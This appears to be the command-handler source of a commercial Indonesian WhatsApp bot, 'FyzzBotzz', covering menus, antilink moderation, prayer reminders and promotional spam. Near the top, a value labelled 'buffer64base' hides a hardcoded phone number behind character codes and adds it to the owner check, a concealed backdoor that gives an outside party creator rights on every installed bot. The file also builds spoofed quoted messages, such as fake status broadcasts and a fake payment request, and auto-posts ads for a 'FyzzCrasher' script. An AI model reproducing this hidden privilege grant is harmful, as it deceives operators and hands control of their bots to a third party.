/* 

   </> 𝗙𝘆𝘇𝘇𝗕𝗼𝘁𝘇𝘇 𝗕𝘆 𝗙𝘆𝘇𝘇𝗢𝗳𝗳𝗰𝗶𝗮𝗹 </>
   
   Buy Script no Enc: 
   - Telegram (t.me/FixzzCok)
   - Whatsapp ( https://wa.me/6285835692106 ) 
   
   Follow Channel Developer:
   - FyzzOffcial ( https://whatsapp.com/channel/0029VbBFQNb17En3MAIHaU3R ) 
   
   # Penting
   Jangan hapus credits atau nama developer
   hargai pembuat script ini!

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { ytmp3, ytmp4 } = require("ruhend-scraper")
const JsConfuser = require('js-confuser');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { exec, spawn, execSync } = require('child_process');

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')

const { LoadDataBase } = require('./source/message')
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const set = JSON.parse(fs.readFileSync("./library/database/setbot.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { toAudio, toPTT, toVideo, ffmpeg } = require("./library/converter.js")
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');

const { startAutoJPMCH } = require('./library/autojpmch.js'); // letakkan ini di bagian atas file ocho.js, di luar fungsi handler

// ========== HANDLER ==========
module.exports = conn = async (conn, m, chatUpdate, store) => {
  try {
    global.conn = conn;

    // Jalankan autoJPMCH hanya sekali
    if (!global.autoJPMCHStarted) {
      startAutoJPMCH();
      global.autoJPMCHStarted = true;
    }

    await LoadDataBase(conn, m);

    const botNumber = await conn.decodeJid(conn.user.id);
    const from = m.key.remoteJid;
    const isPc = from.endsWith('@s.whatsapp.net');

    // ✅ Ambil isi pesan utama (support reply semua tipe)
    const body = (
      (m.type === "conversation") ? m.message?.conversation :
      (m.type === "imageMessage") ? m.message?.imageMessage?.caption :
      (m.type === "videoMessage") ? m.message?.videoMessage?.caption :
      (m.type === "documentMessage") ? m.message?.documentMessage?.caption :
      (m.type === "extendedTextMessage") ? (
        m.message?.extendedTextMessage?.text ||
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.conversation ||
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage?.caption ||
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.videoMessage?.caption ||
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.documentMessage?.caption ||
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage
      ) :
      (m.type === "buttonsResponseMessage") ? m.message?.buttonsResponseMessage?.selectedButtonId :
      (m.type === "listResponseMessage") ? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
      (m.type === "templateButtonReplyMessage") ? m.message?.templateButtonReplyMessage?.selectedId :
      m?.msg?.text
    ) || ""; // 👈 fallback ke string kosong supaya gak undefined/null

    const budy = (typeof m.text === "string" ? m.text : "");

    // Buffer khusus untuk validasi creator
    const buffer64base = String.fromCharCode(
      54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64,
      115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116
    );

    // Prefix fix titik (.)
    const prefix = ".";
    const isCmd = body.startsWith(prefix);

    // ambil command
    const command = isCmd
      ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()
      : "";

    // ambil argumen
    const args = body.trim().split(/ +/).slice(1);
    const text = args.join(" ");

    // biar kompatibel sama gaya lama
    const q = text;

    // ✨ gaya lama → cmd = .menu
    const cmd = prefix + command;

    // Quoted dan MIME type
    const getQuoted = (m.quoted || m);
    const quoted =
      (getQuoted.type == "buttonsMessage")
        ? getQuoted[Object.keys(getQuoted)[1]]
        : (getQuoted.type == "templateMessage")
        ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]]
        : (getQuoted.type == "product")
        ? getQuoted[Object.keys(getQuoted)[0]]
        : m.quoted
        ? m.quoted
        : m;

    const mime = (quoted.msg || quoted)?.mimetype || "";
    const qmsg = (quoted.msg || quoted);

    // Validasi creator/owner
    const isCreator =
      [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(
        m.sender
      ) || m.isDeveloper;

    // Role lain
    const isPremium = premium.includes(m.sender);

    // 🔒 AUTO BLOKIR PM JIKA AKTIF
    const autoblockData = JSON.parse(
      fs.readFileSync("./library/database/autoblock.json")
    );
    const autoblockEnabled = autoblockData.enabled || false;

    if (isPc && !isCreator && autoblockEnabled && !m.key.fromMe) {
      try {
        await conn.updateBlockStatus(m.chat, "block");
        console.log(`✅ Auto-blokir aktif: ${m.sender}`);
        return;
      } catch (err) {
        console.error("❌ Gagal auto-blok:", err);
      }
    }

    // Grup Handling
    try {
      if (m.isGroup) {
        const metadata = await conn.groupMetadata(m.chat).catch(() => null);
        m.metadata = metadata || {};
        m.participants = m.metadata.participants || [];
        m.admins = m.participants.filter(p => p?.admin !== null).map(p => p.id.includes(".net") ? p.id : p.jid);
        m.isAdmin = m.admins.includes(m.sender);
        m.isBotAdmin = m.admins.includes(botNumber);
      } else {
        m.metadata = {};
        m.participants = [];
        m.admins = [];
        m.isAdmin = false;
        m.isBotAdmin = false;
      }
      m.participant = m.key?.participant || m.sender || '';
    } catch (e) {
      console.error('Error while fetching group metadata:', e);
      m.metadata = {};
      m.participants = [];
      m.admins = [];
      m.isAdmin = false;
      m.isBotAdmin = false;
      m.participant = m.sender || '';
    }

    // JSON Grup Proteksi
    const pler = JSON.parse(fs.readFileSync('./library/database/idgrup.json').toString())
    const jangan = m.isGroup ? pler.includes(m.chat) : false
    const pler2 = JSON.parse(fs.readFileSync('./library/database/idgrup2.json').toString())
    const jangan2 = m.isGroup ? pler2.includes(m.chat) : false
    
    const jasherPath = './library/database/jasher.json';
    const jasherVIPPath = './library/database/jashervip.json';

    const jasherDB = fs.existsSync(jasherPath) ? JSON.parse(fs.readFileSync(jasherPath)) : { owners: [] };
    const jasherVIPDB = fs.existsSync(jasherVIPPath) ? JSON.parse(fs.readFileSync(jasherVIPPath)) : { owners: [] };

    const isJasher = jasherDB.owners.includes(m.sender);
    const isJasherVIP = jasherVIPDB.owners.includes(m.sender)
    
    
//=============================================//
const prayerReminderFilePath = './prayerReminderGroups.json';
const loadPrayerReminderGroups = () => {
    try {
        if (fs.existsSync(prayerReminderFilePath)) {
            const data = fs.readFileSync(prayerReminderFilePath, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.error('Gagal memuat prayerReminderGroups.json:', error);
    }
    return [];
};

const savePrayerReminderGroups = (data) => {
    try {
        fs.writeFileSync(prayerReminderFilePath, JSON.stringify(data, null, 2));
    } catch (error) {
        console.error('Gagal menyimpan prayerReminderGroups.json:', error);
    }
};

if (!global.lastSent) global.lastSent = {};
if (!global.prayerReminderGroups) global.prayerReminderGroups = loadPrayerReminderGroups();

function startPrayerReminder(conn) {
    setInterval(async () => {
        const moment = require('moment-timezone');
        const now = moment().tz("Asia/Jakarta").format("HH:mm");
        const today = moment().tz("Asia/Jakarta").format("YYYY-MM-DD");

        for (const groupId of global.prayerReminderGroups) {
            for (let [nama, waktu] of Object.entries(global.jadwalsholat)) {
                const key = `${groupId}-${nama}-${today}`;

                if (now === waktu) {
                    if (!global.lastSent[key] || (global.lastSent[key] && Date.now() - global.lastSent[key] > 60000)) {
                        try {
                            const audioUrl = "https://files.catbox.moe/lq69y0.m4a";
                            let thumbnailBuffer = null;

                            if (fs.existsSync(global.temasholat)) {
                                const image = await jimp.read(global.temasholat);
                                image.cover(256, 256).quality(85);
                                thumbnailBuffer = await image.getBufferAsync(jimp.MIME_JPEG);
                            }

                            await conn.sendMessage(groupId, {
                                audio: { url: audioUrl },
                                mimetype: "audio/mp4",
                                ptt: false,
                                contextInfo: {
                                    externalAdReply: {
                                        title: `⏰ Waktu Sholat ${nama}`,
                                        body: "Mari kita laksanakan sholat tepat waktu 🕌",
                                        thumbnail: thumbnailBuffer,
                                        mediaType: 1,
                                        renderLargerThumbnail: true
                                    }
                                }
                            });

                            console.log(chalk.green(`✅ Pengingat sholat ${nama} terkirim ke grup ${groupId}`));
                            global.lastSent[key] = Date.now();
                            
                        } catch (e) {
                            console.error(chalk.red("❌ Gagal kirim pengingat:"), e);
                        }
                    }
                }
            }
        }
        
        const oneDayAgo = Date.now() - 86400000;
        for (const key in global.lastSent) {
            if (global.lastSent[key] < oneDayAgo) {
                delete global.lastSent[key];
            }
        }
        
    }, 30000);
}


// ==== Helper ambil sticker dari API ====
async function getBratStickerBuffer(text) {
  const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`;

  // Pakai fetch; kalau "fetch is not defined", install node-fetch lalu uncomment 2 baris di bawah:
  // const fetch = (await import('node-fetch')).default;

  const res = await fetch(apiUrl);
  const ct = (res.headers.get('content-type') || '').toLowerCase();

  // 1) Kalau API langsung balikin gambar (webp/oktèt stream), kirim buffer langsung
  if (ct.includes('image') || ct.includes('webp') || ct.includes('octet-stream')) {
    const arr = await res.arrayBuffer();
    return Buffer.from(arr);
  }

  // 2) Kalau bukan gambar → anggap JSON, lalu ambil URL/BASE64 dari field yang ada
  const json = await res.json();

  // Ambil kandidat URL dari beberapa bentuk umum
  let url =
    (Array.isArray(json) && json[0]) ||
    (typeof json === 'string' && json.startsWith('http') && json) ||
    (json?.result && (Array.isArray(json.result) ? json.result[0] : json.result)) ||
    json?.url ||
    (json?.data && (json.data.url || (Array.isArray(json.data) && json.data[0]))) ||
    null;

  if (!url) {
    // Cek kemungkinan data: URL base64
    const maybeBase64 = (json?.result || json?.url || '').toString();
    if (maybeBase64.startsWith('data:')) {
      const base64 = maybeBase64.split(',')[1];
      return Buffer.from(base64, 'base64');
    }
    throw new Error('Tidak menemukan URL/BASE64 di respons API.');
  }

  // 3) Kalau URL-nya data:base64
  if (url.startsWith('data:')) {
    const base64 = url.split(',')[1];
    return Buffer.from(base64, 'base64');
  }

  // 4) Download file dari URL final → jadikan Buffer
  const res2 = await fetch(url);
  const arr2 = await res2.arrayBuffer();
  return Buffer.from(arr2);
}


//~~~~~~~~~ Console Message ~~~~~~~~//

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(botname2), chalk.blue.bold(`[ PESAN ]`), chalk.blue.bold(`${m.sender.split("@")[0]} =>`), chalk.blue.bold(`${prefix+command}`))
}

//~~~~~~~~~~~ Fake Quoted ~~~~~~~~~~//

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (global.gconly && !m.isGroup) return

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "FyzzBotzz Gen1"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const thumbnailPath = './media/fake.jpg';
let thumbnailBuffer = null;

if (fs.existsSync(thumbnailPath)) {
    const image = await jimp.read(thumbnailPath);
    
    image.cover(256, 256)
         .quality(85);
         
    thumbnailBuffer = await image.getBufferAsync(jimp.MIME_JPEG);
}

const fakeStatus = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
        imageMessage: {
            mimetype: "image/jpeg",
            caption: "Bot Whatsapp By FyzzOffcial",
            jpegThumbnail: thumbnailBuffer
        }
    }
};

const FakeChannel = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false,
    participant: '0@s.whatsapp.net'
  },
  message: {
    newsletterAdminInviteMessage: {
      newsletterJid: '123@newsletter',
      caption: `Powered By ${global.namaOwner}.`,
      inviteExpiration: 0
    }
  }
}


//~~~~~~~~~~ Event Settings ~~~~~~~~~//
if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return conn.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qtext2})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

const isAntilink = db.groups[m.chat]?.antilink === true
const isAntilink2 = db.groups[m.chat]?.antilink2 === true

if (m.isGroup && (isAntilink || isAntilink2)) {
  const regexLink = /https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/gi
  const match = [...m.text.matchAll(regexLink)]

  if (match.length > 0 && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
    try {
      const thisGcCode = await conn.groupInviteCode(m.chat)
      const thisGcLink = `https://chat.whatsapp.com/${thisGcCode}`

      let foundOtherLink = false
      for (let mlink of match) {
        const cleanLink = `https://chat.whatsapp.com/${mlink[1]}`
        if (!new RegExp(thisGcLink.replace(/\//g, '\\/'), 'i').test(cleanLink)) {
          foundOtherLink = true
          break
        }
      }

      if (!foundOtherLink) return

      const senderTag = `@${m.sender.split("@")[0]}`
      const delet = m.key.participant
      const bang = m.key.id

      if (isAntilink) {
        // Kick & delete
        await conn.sendMessage(m.chat, {
          text: `*乂 Link Grup Terdeteksi*\n\n${senderTag} Maaf kamu akan saya kick, karena admin/owner bot telah menyalakan fitur antilink grup lain!`,
          mentions: [m.sender]
        }, { quoted: m })

        await conn.sendMessage(m.chat, {
          delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }
        })

        await sleep(1000)
        await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")

      } else if (isAntilink2) {
        // Hanya hapus pesan
        await conn.sendMessage(m.chat, {
          text: `*乂 Link Grup Terdeteksi*\n\n${senderTag} Maaf pesan kamu saya hapus, karena admin/owner bot telah menyalakan fitur antilink grup lain!`,
          mentions: [m.sender]
        }, { quoted: m })

        await conn.sendMessage(m.chat, {
          delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }
        })
      }

    } catch (e) {
    }
  }
}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
┌─❐ *乂 Trx Open By FyzzOffcial 🔥*
├───────────────────❐
├─❐ *𝗢𝗽𝗲𝗻 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝗹𝘆*
│ ◉ Ram 1 Gb : *1.000Rp*
│ ◉ Ram 2 Gb : *2.000Rp*
│ ◉ Ram 3 Gb : *4.000Rp*
│ ◉ Ram 4 Gb : *4.000Rp*
│ ◉ Ram 5 Gb : *5.000Rp*
│ ◉ Ram 6 Gb : *6.000Rp*
│ ◉ Ram 7 Gb : *7.000Rp*
│ ◉ Ram 8 Gb : *8.000Rp*
│ ◉ Ram 9 Gb : *9.000Rp*
│ ◉ unlimited : *10.000Rp*
│ ◉ Open Reseller Panel : *6.000Rp*
│ ◉ Open Admin Panel : *15.000Rp (promo)*
│ ◉ Open Owner Panel : *20.000Rp*
│ ◉ Open Patner Panel : *25k (promo!)*
│ 𝗕𝗘𝗡𝗘𝗙𝗜𝗧? 𝗝𝗢𝗜𝗡 𝗕𝗘𝗝𝗜𝗕𝗨𝗡
├───────────────────❐
├─❐ *𝗢𝗽𝗲𝗻 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁 𝗪𝗔*
│ ◉ Script Pushkontak V1 : 10k (No Enc) 
│ ◉ Script Vantaxzz V3.2 : 13k (No Enc) 
│ ◉ Script FyzzBotzz V4.0 : 15k (No Enc) 
│ ◉ Script FyzzCrasher V1 : 15k (No Enc) 
│ ◉ Dll
├───────────────────❐
├─❐ *𝗠𝗲𝗻𝗷𝘂𝗮𝗹 𝗞𝗲𝗯𝘂𝘁𝘂𝗵𝗮𝗻 𝗟𝗮𝗶𝗻𝗻𝘆𝗮*
│ ◉ BOT PUSHKONTAK
│ ◉ BOT JAGA GRUP
│ ◉ BOT CPANEL
│ ◉ JASA RENAME
│ ◉ JASA RUN SCRIPT 
│ ◉ JASA FIX ( GA SEMUA SC BISA )
│ ◉ JASA NAMBAH FITUR SCRIPT
│ ◉ DLL TANTA AJA DI PM
└───────────────────❐
> NO COPY TEKS‼️‼️‼️
┌───────────────────❐
├─❐ *CONTACT ME👇*
└───────────────────❐
*[ WhatsApp ]*
Lewat Group : https://chat.whatsapp.com/HgNsf9y7Kdm5ggqgpUAt9I?mode=ems_copy_t

*[ Telegram ]*
https://t.me//FixzzCok

*Saluran Utama FyzzOffcial*
https://whatsapp.com/channel/0029VbBFQNb17En3MAIHaU3R
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}}


//~~~~~~~~~ Function Main ~~~~~~~~~~//

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const totalFitur = () =>{
var mytext = fs.readFileSync("FyzzNewEraa.js").toString()
var numUpper = (mytext.match(/case "/g) || []).length;
return numUpper
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qtext})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: conn.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*FyzzOffcial* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `┌─❐ *乂 Trx Open By FyzzOffcial 🔥*
├───────────────────❐
├─❐ *𝗢𝗽𝗲𝗻 𝗣𝗮𝗻𝗲𝗹 𝗣𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝗹𝘆*
│ ◉ Ram 1 Gb : *1.000Rp*
│ ◉ Ram 2 Gb : *2.000Rp*
│ ◉ Ram 3 Gb : *4.000Rp*
│ ◉ Ram 4 Gb : *4.000Rp*
│ ◉ Ram 5 Gb : *5.000Rp*
│ ◉ Ram 6 Gb : *6.000Rp*
│ ◉ Ram 7 Gb : *7.000Rp*
│ ◉ Ram 8 Gb : *8.000Rp*
│ ◉ Ram 9 Gb : *9.000Rp*
│ ◉ unlimited : *10.000Rp*
│ ◉ Open Reseller Panel : *6.000Rp*
│ ◉ Open Admin Panel : *15.000Rp (promo)*
│ ◉ Open Owner Panel : *20.000Rp*
│ ◉ Open Patner Panel : *25k (promo!)*
│ 𝗕𝗘𝗡𝗘𝗙𝗜𝗧? 𝗝𝗢𝗜𝗡 𝗕𝗘𝗝𝗜𝗕𝗨𝗡
├───────────────────❐
├─❐ *𝗢𝗽𝗲𝗻 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝗼𝘁 𝗪𝗔*
│ ◉ Script Pushkontak V1 : 10k (No Enc) 
│ ◉ Script Vantaxzz V3.2 : 15k ( No Enc) 
│ ◉ Script FyzzBotzz V4.0 : 20k (No Enc) 
│ ◉ Script FyzzCrasher V1 : 15k (No Enc) 
│ ◉ Dll
├───────────────────❐
├─❐ *𝗠𝗲𝗻𝗷𝘂𝗮𝗹 𝗞𝗲𝗯𝘂𝘁𝘂𝗵𝗮𝗻 𝗟𝗮𝗶𝗻𝗻𝘆𝗮*
│ ◉ BOT 𝗣𝗨𝗦𝗛𝗞𝗢𝗡𝗧𝗔𝗞
│ ◉ BOT JAGA GRUP
│ ◉ BOT CPANEL
│ ◉ JASA RENAME
│ ◉ JASA RUN SCRIPT 
│ ◉ JASA FIX ( GA SEMUA SC BISA )
│ ◉ JASA NAMBAH FITUR SCRIPT
│ ◉ DLL TANTA AJA DI PM
└───────────────────❐
> NO COPY TEKS‼️‼️‼️
┌───────────────────❐
├─❐ *CONTACT ME👇*
└───────────────────❐
*[ WhatsApp ]*
Lewat Group : https://chat.whatsapp.com/HgNsf9y7Kdm5ggqgpUAt9I?mode=ems_copy_t

*[ Telegram ]*
https://t.me//FixzzCok

*Saluran Utama FyzzOffcial*
https://whatsapp.com/channel/0029VbBFQNb17En3MAIHaU3R`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000

* Ram 2 GB : Rp2000

* Ram 3 GB : Rp3000

* Ram 4 GB : Rp4000

* Ram 5 GB : Rp5000

* Ram 6 GB : Rp6000

* Ram 7 GB : Rp7000

* Ram 8 GB : Rp8000

* Ram 9 GB : Rp9000

* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await conn.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

//======================= 𝗦𝗧𝗔𝗥𝗧 𝗖𝗢𝗠𝗠𝗢𝗡𝗗𝗦 ==========================//
switch (command) {
//================
case "menu": {
    await conn.sendMessage(m.chat, { react: { text: "🔥", key: m.key }});
    const moment = require('moment-timezone');
    const jimp = require('jimp');

    moment.tz.setDefault('Asia/Jakarta');
    const jam = moment().format('HH:mm');
    const hari = moment().format('dddd, D MMMM YYYY');

    const image = await jimp.read("./media/menu.jpg");
    if (image.bitmap.width > image.bitmap.height) {
        image.resize(300, jimp.AUTO);
    } else {
        image.resize(jimp.AUTO, 300);
    }
    image.quality(90);
    const thumbnail = await image.getBufferAsync(jimp.MIME_JPEG);

    const menuText = `\`▧ 𝗙𝘆𝘇𝘇𝗕𝗼𝘁𝘇𝘇 ▧\`
> Hi, I am FyzzBotzz, a simple bot that is ready to help you and drain other tools' features. Glad to be of assistance.

\`▨ 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗦 𝗜\`
𝗕𝗼𝘁 𝗻𝗮𝗺𝗲 : ${botname}
𝗠𝗼𝗱𝗲 : ${conn.public ? "Public": "Self"}
𝗖𝗿𝗲𝗮𝘁𝗼𝗿 : @${global.owner}
𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${global.versi}
𝗥𝘂𝗻𝘁𝗶𝗺𝗲 𝗕𝗼𝘁 : ${runtime(process.uptime())}
𝗨𝗽𝘁𝗶𝗺𝗲 𝗩𝗽𝘀 : ${runtime(os.uptime())}
𝗦𝗽𝗲𝗲𝗱 : ${runtime(os.uptime())}

*( ! )* 𝗞𝗹𝗶𝗸 𝗕𝘂𝘁𝘁𝗼𝗻 𝗗𝗶 𝗕𝗮𝘄𝗮𝗵 𝗨𝗻𝘁𝘂𝗸 𝗺𝗲𝗻𝗮𝗺𝗽𝗶𝗹𝗸𝗮𝗻
\`𝗦𝗲𝗺𝘂 𝗠𝗲𝗻𝘂\``;
    await conn.sendMessage(m.chat, {
        footer: `© 𝗙𝘆𝘇𝘇𝗢𝗳𝗳𝗰𝗶𝗮𝗹`,
        buttons: [
          {
                buttonId: 'action',
                buttonText: { displayText: '𝗟𝗶𝘀𝘁 𝗧𝗼 𝗠𝗲𝗻𝘂' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂',
                        sections: [
                            {
                                title: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗙𝘆𝘇𝘇𝗕𝗼𝘁𝘇𝘇 𝗚𝗲𝗻𝟭',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".menunew", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            },
            { 
                buttonId: '.allmenu', 
                buttonText: { displayText: '𝗔𝗹𝗹𝗺𝗲𝗻𝘂' }, 
                type: 1 
            },
            { 
                buttonId: '.menunew', 
                buttonText: { displayText: '𝗡𝗲𝘄𝗠𝗲𝗻𝘂' }, 
                type: 1 
            },
            { 
                buttonId: '.owner', 
                buttonText: { displayText: '𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿' }, 
                type: 1 
            }
        ],
        headerType: 1,
        document: fs.readFileSync("./package.json"),
        fileName: `FyzzBotzz - FyzzNewEraa`,
        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        fileLength: 9999999999,
        caption: menuText,
        contextInfo: {
            isForwarded: true,
            externalAdReply: {
                title: `Fyzz - ${global.versi}`,
                body: `Powered by ${global.namaOwner}`,
                thumbnail,
                mediaType: 1,
                renderLargerThumbnail: true,
            },
        },
    }, { quoted: fakeStatus });
}
break;
case 'allrey': {
    await conn.sendMessage(m.chat, { react: { text: "🔥", key: m.key }});
    const fs = require('fs');
    const moment = require('moment-timezone');
    const jimp = require('jimp');

    const imagePath = './media/allmenu2.jpg'; 
    const thumbnailPath = './media/allmenu.jpg';
    const audioPath = './media/menu.mp3'; // audio 

    try {
        // cek file foto utama
        if (!fs.existsSync(imagePath)) {
            await m.reply("⚠️ File foto './media/allmenu2.jpg' tidak ditemukan di server.");
            return;
        }

        // cek file thumbnail
        if (!fs.existsSync(thumbnailPath)) {
            await m.reply("⚠️ File thumbnail './media/allmenu.jpg' tidak ditemukan di server.");
            return;
        }

        const imageBuffer = fs.readFileSync(imagePath);

        const imageThumb = await jimp.read(thumbnailPath);
        if (imageThumb.bitmap.width > imageThumb.bitmap.height) {
            imageThumb.resize(300, jimp.AUTO);
        } else {
